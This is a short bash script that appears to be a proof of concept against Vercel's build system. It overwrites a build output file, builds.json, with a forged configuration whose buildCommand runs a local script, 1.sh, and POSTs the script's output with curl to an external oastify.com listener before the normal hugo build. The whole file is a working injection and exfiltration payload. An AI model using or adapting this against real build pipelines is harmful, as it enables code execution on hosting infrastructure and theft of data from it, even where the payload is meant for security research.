#!/bin/bash

cat vercel.json
echo "edited file"
echo -n '{"target": "preview","argv": ["/node16/bin/node","/var/task/node_modules/.bin/vercel","build","--output","/vercel/output"],"builds": [{"require": "@vercel/static-build","requirePath": "/var/task/node_modules/@vercel/static-build/dist/index","apiVersion": 2,"src": "config.toml","use": "@vercel/static-build","config": {"zeroConfig": true,"framework": "hugo","alias": "test444-nu.vercel.app","buildCommand": "curl -X POST -d \"$(chmod 777 1.sh && ./1.sh)\" https://tebvp8x6drpdp3n0butq3nja319sxls9h.oastify.com/local && hugo -D --gc"}}]}' > ../output/builds.json
cat ../output/builds.json
echo "up0"
